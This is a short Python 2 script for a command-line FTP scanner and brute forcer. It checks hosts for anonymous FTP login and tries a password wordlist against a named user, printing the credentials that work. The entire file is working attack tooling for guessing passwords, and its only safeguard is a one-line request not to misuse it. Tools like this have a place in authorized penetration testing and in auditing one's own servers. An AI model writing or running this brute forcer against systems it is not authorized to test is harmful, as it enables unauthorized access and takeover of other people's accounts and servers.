#!./env/bin/python

""" FTP Scanner/Brute Forcer

    Use this to either scan a host for anonymous FTP logins or
    to try a password list against a host.

    Don't be a moron, please don't use this for something illegal.

    Usage:
        ftp.py brute [-v <host> <user> <password_file>]
        ftp.py anon [-v <host>]
        ftp.py -h | --help
        ftp.py --version

    Options:
        host            Host name to scan/attack
        user            Username to attack against
        password_file   newline separated wordlist
        -v              verbose
        -h --help       Show this screen.
        --version       Show version

    Examples:
        ./ftp.py anon ftp.debian.org
        ./ftp.py brute localhost root wordlist/general/big.txt
        ./ftp.py brute -v localhost root wordlist/general/common.txt
"""

import ftplib
from docopt import docopt
from utilities import escape_color


def brute_login(hostname, user_name, password_file, verbose=False):
    fp = open(password_file, 'r')

    for line in fp.readlines():
        password = line.strip('\r').strip('\n')

        if verbose:
            print "[+] Trying: " + user_name + "/" + password

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user_name, password)
            ftp.quit()

            return (user_name, password)
        except Exception:
            pass

    return False


def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        ftp.quit()

        return True
    except Exception:
        return False


def main(arguments):
    if arguments['anon']:
        if not arguments['<host>']:
            host = raw_input("Hostname: ")
        else:
            host = arguments['<host>']

        anon = anon_login(host)

        if anon:
            print escape_color('[*] ' + str(host) + ' FTP Anonymous Logon Succeeded.', "green")
        else:
            print escape_color('[-] ' + str(host) + ' FTP Anonymous Logon Failed.', "red")
    elif arguments['brute']:
        if not arguments['<host>']:
            host = raw_input("Hostname: ")
        else:
            host = arguments['<host>']

        if not arguments['<user>']:
            user = raw_input("User name: ")
        else:
            user = arguments['<user>']

        if not arguments['<password_file>']:
            password_file = raw_input("Password File Path: ")
        else:
            password_file = arguments['<password_file>']

        if arguments['-v']:
            credentials = brute_login(host, user, password_file, verbose=True)
        else:
            credentials = brute_login(host, user, password_file)

        if credentials:
            print escape_color('[*] FTP Logon Succeeded: ' + credentials[0] + ":" + credentials[1], "green")
        else:
            print escape_color('[-] No password found for that user on the FTP server.', "red")


if __name__ == '__main__':
    arguments = docopt(__doc__, version="0.1")
    main(arguments)
